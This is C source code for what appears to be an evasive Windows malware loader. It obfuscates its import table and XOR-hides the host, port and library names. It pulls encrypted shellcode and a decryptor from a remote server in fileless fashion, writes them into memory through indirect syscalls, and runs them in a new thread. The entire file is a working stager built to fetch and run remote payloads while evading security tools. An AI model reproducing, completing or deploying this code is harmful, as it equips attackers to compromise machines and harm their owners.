#include "common.h"

int main() {
    PVOID shellcodeAddress = NULL;
    PVOID decrypterAddress = NULL;
    LPVOID addr = NULL;
    BYTE high = NULL;
    BYTE low = NULL;
    WORD syscallNum = NULL;
    INT_PTR syscallAddr = NULL;
    DWORD OldProtect = 0;

    IatCamouflage();

    char cipher[] = "c";
    char key[] = "k";
    size_t keyLen = sizeof(xorKey);
    char sHost[] = { 0x72, 0x5f, 0x40, 0x47, 0x55, 0x5c, 0x44, 0x6a, 0x54, 0x56 };
    XORNull((char*)sHost, sizeof(sHost), (char*)xorKey, keyLen);
    char host[16];
    StringCopyA(host, sHost);
    XORNull((char*)sHost, sizeof(sHost), (char*)xorKey, keyLen);
    char sPort[] = { 0x7b, 0x5f, 0x5e, 0x47, 0x0 };
    XORNull((char*)sPort, sizeof(sPort), (char*)xorKey, keyLen);
    char port[8];
    StringCopyA(port, sPort);
    XORNull((char*)sPort, sizeof(sPort), (char*)xorKey, keyLen);

    HMODULE krnlAddr = GetModuleHandleImpl(109513359); //kernel32.dll
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)getAPIAddr(krnlAddr, 104173313); //loadlibrary
    HMODULE ntdllAddr = GetModuleHandleImpl(4097367); //ntdll.dll

    char sWs2_32_dll[] = { 0x34, 0x1c, 0x5c, 0x29, 0x56, 0x40, 0x5a, 0x20, 0x9, 0xa, 0x0 };
    XORNull((char*)sWs2_32_dll, sizeof(sWs2_32_dll), (char*)xorKey, keyLen);
    HMODULE hModule = pLoadLibraryA(sWs2_32_dll);
    XORNull((char*)sWs2_32_dll, sizeof(sWs2_32_dll), (char*)xorKey, keyLen);

    //PRINTA("[+] Getting data\n");
    DATA shellcode = getFilelessData(host, port, cipher, hModule, pLoadLibraryA);

    if (!shellcode.data) {
        //PRINTA("[-] Failed in retrieving data \n");
        return -1;
    }
    SIZE_T szShellcode = shellcode.len;
    //PRINTA("[+] Data retrieved %d bytes\n", shellcode.len);

    //PRINTA("\n\n[+] Retrieving additional data\n\n");
    DATA decryptor = getFilelessData(host, port, key, hModule, pLoadLibraryA);
    if (!decryptor.data) {
        //PRINTA("[-] Failed in retrieving data \n");
        return -1;
    }
	SIZE_T szDecryptor = decryptor.len;

    //PRINTA("[+] Retrieved %d bytes\n\n", decryptor.len);

    HANDLE hProcess = GetCurrentProcess();
    //if (!hProcess) {
    //    PRINTA("Error obtaining handle to target process: %d\n", GetLastError());
    //    return -1;
    //}

    addr = getAPIAddr(ntdllAddr, 18887768681269);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);

    SIZE_T dwSize = shellcode.len;
    SIZE_T RegionSize = szShellcode + sizeof(SIZE_T);
    NTSTATUS status = sysZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        PRINTA("[-] Failed in 1 \n");
        return -1;
    }
    PBYTE pShellcode = (PBYTE)shellcodeAddress;

    addr = getAPIAddr(ntdllAddr, 687514600120);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    ULONG bytesWritten = 0;

    status = sysNtWriteVirtualMemory(hProcess, pShellcode, &szShellcode, sizeof(SIZE_T), &bytesWritten);
    if (!NT_SUCCESS(status)) {
        PRINTA("[-] Failed in 2 \n");
        return -1;
    }

    status = sysNtWriteVirtualMemory(hProcess, pShellcode + sizeof(SIZE_T), shellcode.data, szShellcode, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        PRINTA("[-] Failed in 3 \n");
        return -1;
    }

    addr = getAPIAddr(ntdllAddr, 18887768681269);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);

    status = sysZwAllocateVirtualMemory(hProcess, &decrypterAddress, 0, &szDecryptor, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        PRINTA("[-] Failed in 4 \n");
        return -1;
    }
	PBYTE pDecryptor = (PBYTE)decrypterAddress;

    addr = getAPIAddr(ntdllAddr, 687514600120);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);

    status = sysNtWriteVirtualMemory(hProcess, pDecryptor, decryptor.data, szDecryptor, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        PRINTA("[-] Failed in 5 \n");
        return -1;
    }

    addr = getAPIAddr(ntdllAddr, 6180333595348);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(hProcess, (PVOID *)&pDecryptor, (PSIZE_T)&szDecryptor, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        PRINTA("[-] Failed in 6 \n");
        return -1;
    }

    HANDLE hThread = INVALID_HANDLE_VALUE;
    addr = getAPIAddr(ntdllAddr, 8454456120);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    status = sysNtCreateThreadEx(
        &hThread,                    // ThreadHandle
        0x1FFFFF,                   // DesiredAccess (All access)
        NULL,                       // ObjectAttributes
        hProcess,                   // ProcessHandle
        (LPTHREAD_START_ROUTINE)pDecryptor,  // StartRoutine
        pShellcode,          // Argument
        FALSE,                      // CreateSuspended
        0,                         // StackZeroBits
        0,                         // SizeOfStackCommit
        0,                         // SizeOfStackReserve
        NULL                       // BytesBuffer
    );

    LARGE_INTEGER* Timeout = NULL;
    addr = getAPIAddr(ntdllAddr, 2060238558140);
    syscallNum = GetSSN(addr);
    syscallAddr = GetsyscallInstr(addr);
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    
    sysNtWaitForSingleObject(hThread, FALSE, Timeout);
    return 0;
}